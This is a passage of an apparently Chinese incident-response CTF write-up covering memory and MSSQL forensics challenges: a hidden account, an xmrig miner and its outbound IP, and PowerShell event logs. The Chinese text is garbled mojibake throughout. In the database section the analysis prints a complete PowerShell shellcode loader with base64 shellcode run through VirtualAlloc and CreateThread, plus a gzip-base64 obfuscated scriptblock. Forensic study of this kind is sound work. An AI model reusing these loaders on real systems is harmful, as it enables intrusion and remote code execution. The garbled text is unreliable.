¸è·Ÿè¸ªå’Œç®¡ç†è¿›ç¨‹çš„é‡è¦æ–¹å¼ã€‚æ¯å½“ä¸€ä¸ªæ–°çš„è¿›ç¨‹è¢«åˆ›å»ºæ—¶ï¼Œæ“ä½œç³»ç»Ÿä¼šä¸ºå…¶åˆ†é…ä¸€ä¸ªå”¯ä¸€çš„ PIDã€‚</li><li><strong>ç¤ºä¾‹</strong>ï¼šå¦‚æœä½ é€šè¿‡å‘½ä»¤ï¼ˆå¦‚ <code>ps</code> æˆ– <code>top</code>ï¼‰æŸ¥çœ‹è¿›ç¨‹åˆ—è¡¨ï¼Œä½ ä¼šçœ‹åˆ°æ¯ä¸ªè¿›ç¨‹å¯¹åº”çš„ PIDã€‚æ¯”å¦‚ï¼ŒPID ä¸º 1234 çš„è¿›ç¨‹å¯èƒ½æ˜¯ä¸€ä¸ªæ­£åœ¨è¿è¡Œçš„ç¨‹åºã€‚</li></ul><p><strong>PPIDï¼ˆParent Process IDï¼‰</strong></p><ul><li><strong>å®šä¹‰</strong>ï¼šPPID æ˜¯ä¸€ä¸ªè¿›ç¨‹çš„çˆ¶è¿›ç¨‹çš„ PIDã€‚æ¢å¥è¯è¯´ï¼ŒPPID æŒ‡çš„æ˜¯å¯åŠ¨å½“å‰è¿›ç¨‹çš„è¿›ç¨‹çš„æ ‡è¯†ç¬¦ã€‚æ¯ä¸ªè¿›ç¨‹ï¼ˆé™¤äº†åˆå§‹åŒ–è¿›ç¨‹ï¼‰éƒ½æœ‰ä¸€ä¸ªçˆ¶è¿›ç¨‹ã€‚</li><li><strong>ä½œç”¨</strong>ï¼šPPID æ˜¾ç¤ºäº†å½“å‰è¿›ç¨‹ä¸å…¶çˆ¶è¿›ç¨‹çš„å…³ç³»ã€‚æ“ä½œç³»ç»Ÿä½¿ç”¨ PPID æ¥ç®¡ç†è¿›ç¨‹ä¹‹é—´çš„å±‚çº§å…³ç³»ï¼Œå½“ä¸€ä¸ªè¿›ç¨‹é€€å‡ºæ—¶ï¼Œå®ƒçš„å­è¿›ç¨‹å¯èƒ½ä¼šè¢«é‡æ–°åˆ†é…ç»™å¦ä¸€ä¸ªçˆ¶è¿›ç¨‹ï¼ˆé€šå¸¸æ˜¯ <code>init</code> è¿›ç¨‹ï¼‰ã€‚</li><li><strong>ç¤ºä¾‹</strong>ï¼šå‡è®¾è¿›ç¨‹ PID ä¸º 1234 çš„è¿›ç¨‹æ˜¯ç”± PID ä¸º 5678 çš„è¿›ç¨‹å¯åŠ¨çš„ï¼Œé‚£ä¹ˆè¿›ç¨‹ 1234 çš„ PPID å°±æ˜¯ 5678ã€‚</li></ul><p>ä½†æ˜¯è¿™é‡Œä¸¤ä¸ªè¯•äº†éƒ½ä¸è¡Œ</p><p>åæ¥æ‰çŸ¥é“</p><p><strong>UTC+0000</strong> æ˜¯ä¸€ç§è¡¨ç¤ºæ—¶é—´åç§»é‡çš„æ ¼å¼ï¼Œç”¨äºè¯´æ˜æŸä¸ªæ—¶é—´ä¸åè°ƒä¸–ç•Œæ—¶ï¼ˆUTCï¼ŒUniversal Time Coordinatedï¼‰çš„å…³ç³»ã€‚</p><p><strong>UTC+0000</strong> è¡¨ç¤ºæ²¡æœ‰æ—¶é—´åç§»çš„åè°ƒä¸–ç•Œæ—¶ï¼Œå¸¸ç”¨äºä¸å—æ—¶åŒºå½±å“çš„åœºåˆã€‚</p><p>ä¸­å›½ä½¿ç”¨çš„æ—¶åŒºæ˜¯ <strong>ä¸­å›½æ ‡å‡†æ—¶é—´ï¼ˆCSTï¼‰</strong>ï¼Œä¹Ÿè¢«ç§°ä¸º <strong>åŒ—äº¬æ—¶é—´</strong>ã€‚å…¶æ—¶åŒºåç§»é‡æ˜¯ <strong>UTC+08:00</strong>ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œä¸­å›½çš„æ—¶é—´æ¯”åè°ƒä¸–ç•Œæ—¶ï¼ˆUTCï¼‰å¿« 8 å°æ—¶ã€‚</p><p>æ‰€ä»¥è¦åŠ 8å°æ—¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2024/12/21 00:15:34&#125;</span><br></pre></td></tr></table></figure><p><strong>æ–¹æ³•äºŒï¼š</strong></p><p>æˆ‘ä»¬åœ¨filescanæ–‡ä»¶ä¸­å¯ä»¥æ‰¾åˆ°Windowsæ—¥å¿—æ–‡ä»¶Security.evtxï¼Œ<strong>æ³¨æ„å¤§å†™</strong></p><p><code>security.evtx</code> æ˜¯ Windows æ“ä½œç³»ç»Ÿä¸­çš„ä¸€ä¸ªäº‹ä»¶æ—¥å¿—æ–‡ä»¶ï¼Œä¸»è¦è®°å½•ä¸ç³»ç»Ÿå®‰å…¨ç›¸å…³çš„äº‹ä»¶ä¿¡æ¯ã€‚å®ƒæ˜¯ Windows æ—¥å¿—æ–‡ä»¶çš„ä¸€éƒ¨åˆ†ï¼Œç”¨äºå­˜å‚¨å…³äºç”¨æˆ·ç™»å½•ã€è´¦æˆ·ç®¡ç†ã€å®‰å…¨å®¡è®¡ã€ç³»ç»Ÿè®¿é—®æ§åˆ¶ç­‰äº‹ä»¶çš„æ•°æ®ã€‚</p><p>æ”»å‡»è€…åˆ©ç”¨è·³æ¿rdpç™»å½•å—å®³æœºï¼Œé‚£ä¹ˆwindowsæ—¥å¿—è‚¯å®šä¼šæœ‰ç›¸å…³è®°å½•ã€‚</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229113321749.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><p>æˆ‘ä»¬æŠŠå®ƒdumpä¸‹æ¥</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229113401080.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><p>dumpä¸‹æ¥åç¼€æ”¹æˆevtxå°±è¡Œï¼Œç„¶åæ”¾åˆ°å®ç“œåˆ†æï¼</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229113532493.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229113556890.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2024/12/21 00:15:34&#125;</span><br></pre></td></tr></table></figure><h3 id="å†…å­˜å–è¯-6"><a href="#å†…å­˜å–è¯-6" class="headerlink" title="å†…å­˜å–è¯-6"></a>å†…å­˜å–è¯-6</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">é¢˜ç›®æ–‡ä»¶ï¼šSERVER-2008-20241220-162057</span><br><span class="line">è¯·æ‰¾åˆ°æ”»å‡»è€…åˆ›å»ºçš„ç”¨æˆ·çš„å¯†ç å“ˆå¸Œå€¼</span><br><span class="line">flagæ ¼å¼ flag&#123;XXXX&#125;</span><br></pre></td></tr></table></figure><p>åˆ›å»ºçš„ç”¨æˆ·æ˜¯ASP.NET</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229122231066.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;5ffe97489cbec1e08d0c6339ec39416d&#125;</span><br></pre></td></tr></table></figure><h2 id="æ•°æ®åº“"><a href="#æ•°æ®åº“" class="headerlink" title="æ•°æ®åº“"></a>æ•°æ®åº“</h2><p>è¿™é‡Œæˆ‘ä»¬å…ˆè·å–è™šæ‹Ÿæœºadministratorç”¨æˆ·çš„å¯†ç </p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229132342981.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229132335459.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><h3 id="æ•°æ®åº“-1"><a href="#æ•°æ®åº“-1" class="headerlink" title="æ•°æ®åº“-1"></a>æ•°æ®åº“-1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">é¢˜ç›®é™„ä»¶ï¼šmssqlã€mssqlé¢˜-å¤‡ä»½æ•°æ®åº“</span><br><span class="line">è¯·æ‰¾åˆ°æ”»å‡»è€…åˆ›å»ºéšè—è´¦æˆ·çš„æ—¶é—´</span><br><span class="line">flagæ ¼å¼ å¦‚ flag&#123;2024/01/01 00:00:00&#125;</span><br></pre></td></tr></table></figure><p>ç»™äº†vmdkå’Œovfï¼Œå¯ä»¥ç”¨vmwareæ‰“å¼€å’Œå–è¯</p><p><strong>VMDK</strong> æ˜¯ä¸€ç§æ–‡ä»¶åç¼€ï¼Œä»£è¡¨ <strong>Virtual Machine Disk</strong>ï¼Œæ˜¯ä¸€ç§è™šæ‹Ÿç£ç›˜æ–‡ä»¶æ ¼å¼ã€‚å®ƒç”± VMware å¼€å‘ï¼Œç”¨äºå­˜å‚¨è™šæ‹Ÿæœºçš„ç¡¬ç›˜å†…å®¹</p><p>å…ˆæ‰“å¼€çœ‹çœ‹ï¼Œå‘ç°éœ€è¦å¯†ç ï¼Œé‚£ä¹ˆï¼å–è¯å¤§å¸ˆï¼å¯åŠ¨ï¼</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229130911566.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><p>åœ¨ Windows ä¸­ï¼Œè´¦æˆ·åä»¥ <strong><code>$</code></strong> ç»“å°¾çš„é€šå¸¸è¡¨ç¤ºéšè—çš„å…±äº«æˆ–èµ„æºã€‚</p><p>åªæœ‰ä¸€ä¸ªtest$</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;test$&#125;</span><br></pre></td></tr></table></figure><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229131325621.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2024-12-16 15:24:21</span><br></pre></td></tr></table></figure><p>å¯†ç è®¾ç½®æ—¶é—´å¾ˆæœ‰å¯èƒ½å°±æ˜¯åˆ›å»ºç”¨æˆ·çš„æ—¶é—´</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2024/12/16 15:24:21&#125;</span><br></pre></td></tr></table></figure><p>ä¸ä»…å–è¯å¤§å¸ˆå¯ä»¥å‘ç°éšè—ç”¨æˆ·ï¼Œè¿™é‡Œä¹Ÿå¯ä»¥compmgmt.msc</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229132651247.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><h3 id="æ•°æ®åº“-2"><a href="#æ•°æ®åº“-2" class="headerlink" title="æ•°æ®åº“-2"></a>æ•°æ®åº“-2</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">é¢˜ç›®é™„ä»¶ï¼šmssqlã€mssqlé¢˜-å¤‡ä»½æ•°æ®åº“</span><br><span class="line">è¯·æ‰¾åˆ°æ¶æ„æ–‡ä»¶çš„åç§°</span><br><span class="line">flagæ ¼å¼ å¦‚ flag&#123;*.*&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ ç«ç»’å‰‘åˆ†æ</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229133350472.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><p>å‘ç°cç›˜javaç›®å½•ä¸‹æœ‰ä¸€ä¸ªxmrig.exeï¼Œæœ‰è¿œç¨‹åœ°å€å’Œæœ¬åœ°åœ°å€çš„è¿æ¥ï¼ŒçŒœæµ‹æ˜¯æ¶æ„åé—¨æ–‡ä»¶ï¼</p><p>ç™¾åº¦ä¸€ä¸‹çœ‹çœ‹</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229133446413.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><p>å¡Œæˆ¿äº†ï¼ï¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;xmrig.exe&#125;</span><br></pre></td></tr></table></figure><h3 id="æ•°æ®åº“-3"><a href="#æ•°æ®åº“-3" class="headerlink" title="æ•°æ®åº“-3"></a>æ•°æ®åº“-3</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">é¢˜ç›®é™„ä»¶ï¼šmssqlã€mssqlé¢˜-å¤‡ä»½æ•°æ®åº“</span><br><span class="line">è¯·æ‰¾åˆ°æ¶æ„æ–‡ä»¶çš„å¤–è”åœ°å€</span><br><span class="line">flagæ ¼å¼ å¦‚ flag&#123;1.1.1.1&#125;</span><br></pre></td></tr></table></figure><p>å¤–é“¾åœ°å€ï¼Œç®€å•ï¼Œä¸Šé¢æœ‰äº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">203.107.45.167:3333</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;203.107.45.167&#125;</span><br></pre></td></tr></table></figure><h3 id="æ•°æ®åº“-4"><a href="#æ•°æ®åº“-4" class="headerlink" title="æ•°æ®åº“-4"></a>æ•°æ®åº“-4</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">é¢˜ç›®é™„ä»¶ï¼šmssqlã€mssqlé¢˜-å¤‡ä»½æ•°æ®åº“</span><br><span class="line">è¯·ä¿®å¤æ•°æ®åº“</span><br><span class="line">flagæ ¼å¼ å¦‚ flag&#123;xxxxx&#125;</span><br></pre></td></tr></table></figure><p>ä¿®å¤æ•°æ®åº“ï¼Ÿï¼Ÿï¼Ÿ</p><h3 id="æ•°æ®åº“-5"><a href="#æ•°æ®åº“-5" class="headerlink" title="æ•°æ®åº“-5"></a>æ•°æ®åº“-5</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">é¢˜ç›®é™„ä»¶ï¼šmssqlã€mssqlé¢˜-å¤‡ä»½æ•°æ®åº“</span><br><span class="line">è¯·æäº¤powershellå‘½ä»¤ä¸­æ¶æ„æ–‡ä»¶çš„MD5</span><br><span class="line">flagæ ¼å¼ å¦‚ flag&#123;xxxxx&#125;</span><br></pre></td></tr></table></figure><p>powershellå‘½ä»¤ï¼Œçœ‹æ—¥å¿—</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229134458850.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229134531627.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><p>å‘ç°å­˜åœ¨å¤§é‡è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼Œæˆ‘ä»¬é€ä¸ªåˆ†æ</p><p>åœ¨åé¢å‡ ä¸ªå‘ç°äº†æ¯”è¾ƒç‰¹æ®Šçš„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">- EventData </span><br><span class="line"></span><br><span class="line">  MessageNumber 1 </span><br><span class="line">  MessageTotal 1 </span><br><span class="line">  ScriptBlockText function tWk &#123; Param ($k0M, $ybp) $f2w = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object &#123; $_.GlobalAssemblyCache -And $_.Location.Split(&#x27;\\&#x27;)[-1].Equals(&#x27;System.dll&#x27;) &#125;).GetType(&#x27;Microsoft.Win32.UnsafeNativeMethods&#x27;) return $f2w.GetMethod(&#x27;GetProcAddress&#x27;, [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($f2w.GetMethod(&#x27;GetModuleHandle&#x27;)).Invoke($null, @($k0M)))), $ybp)) &#125; function lVhI5 &#123; Param ( [Parameter(Position = 0, Mandatory = $True)] [Type[]] $v8K8, [Parameter(Position = 1)] [Type] $nZWM = [Void] ) $p8dl = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName(&#x27;ReflectedDelegate&#x27;)), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule(&#x27;InMemoryModule&#x27;, $false).DefineType(&#x27;MyDelegateType&#x27;, &#x27;Class, Public, Sealed, AnsiClass, AutoClass&#x27;, [System.MulticastDelegate]) $p8dl.DefineConstructor(&#x27;RTSpecialName, HideBySig, Public&#x27;, [System.Reflection.CallingConventions]::Standard, $v8K8).SetImplementationFlags(&#x27;Runtime, Managed&#x27;) $p8dl.DefineMethod(&#x27;Invoke&#x27;, &#x27;Public, HideBySig, NewSlot, Virtual&#x27;, $nZWM, $v8K8).SetImplementationFlags(&#x27;Runtime, Managed&#x27;) return $p8dl.CreateType() &#125; [Byte[]]$tUZml = [System.Convert]::FromBase64String(&quot;/EiD5PDozAAAAEFRQVBSUUgx0lZlSItSYEiLUhhIi1IgTTHJSItyUEgPt0pKSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0ItIGESLQCBJAdBQ41ZI/8lNMclBizSISAHWSDHAQcHJDaxBAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEFYQVheSAHQWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCAAG9wKiu3EFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V&quot;) [Uint32]$uKrz = 0 $rS = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((tWk kernel32.dll VirtualAlloc), (lVhI5 @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $tUZml.Length,0x3000, 0x04) [System.Runtime.InteropServices.Marshal]::Copy($tUZml, 0, $rS, $tUZml.length) if (([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((tWk kernel32.dll VirtualProtect), (lVhI5 @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]))).Invoke($rS, [Uint32]$tUZml.Length, 0x10, [Ref]$uKrz)) -eq $true) &#123; $yfm6I = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((tWk kernel32.dll CreateThread), (lVhI5 @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$rS,[IntPtr]::Zero,0,[IntPtr]::Zero) [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((tWk kernel32.dll WaitForSingleObject), (lVhI5 @([IntPtr], [Int32]))).Invoke($yfm6I,0xffffffff) | Out-Null &#125;  </span><br><span class="line">  ScriptBlockId 6272cc91-9ab4-4901-8088-ca946f7ae722 </span><br><span class="line">  Path  </span><br></pre></td></tr></table></figure><p>å…³æ³¨æ­¤å¤„ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[System.Convert]::FromBase64String(&quot;/EiD5PDozAAAAEFRQVBSUUgx0lZlSItSYEiLUhhIi1IgTTHJSItyUEgPt0pKSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0ItIGESLQCBJAdBQ41ZI/8lNMclBizSISAHWSDHAQcHJDaxBAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEFYQVheSAHQWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCAAG9wKiu3EFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V&quot;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">- EventData </span><br><span class="line"></span><br><span class="line">  MessageNumber 1 </span><br><span class="line">  MessageTotal 1 </span><br><span class="line">  ScriptBlockText &amp;([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(((&#x27;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&#123;0&#125;&#x27;)-f&#x27;A&#x27;,&#x27;f&#x27;,&#x27;M&#x27;)))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd())) </span><br><span class="line">  ScriptBlockId 5ef6ec2a-3ad1-4051-8fba-a804b7bddefb </span><br><span class="line">  Path  </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç¨å¾®é—®ä¸€ä¸‹AI</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229135320255.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><p>å…¶å®è‡ªå·±ä¹Ÿçœ‹å¾—å‡ºæ¥ï¼Œå…¶ä¸­çš„å…³é”®VirtualProtectï¼ŒInvokeï¼Œkernel32.dllå…¶å®å¯ä»¥çŒœå‡ºæ¥ï¼Œç›¸å½“äºå…æ€çš„æ··æ·†ï¼Œbase64è§£ç åæ‰§è¡Œshellcodeã€‚</p><p>åŒæ—¶ä¹Ÿå‘ç°äº†System.IO.Compression.GzipStream</p><p>æ ¹æ®æ—¶é—´åˆ¤æ–­ï¼Œåº”è¯¥æ˜¯å…ˆgzå‹ç¼©ï¼Œå†base64</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229135841104.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><p>å¯¼å‡ºçœ‹çœ‹</p><img 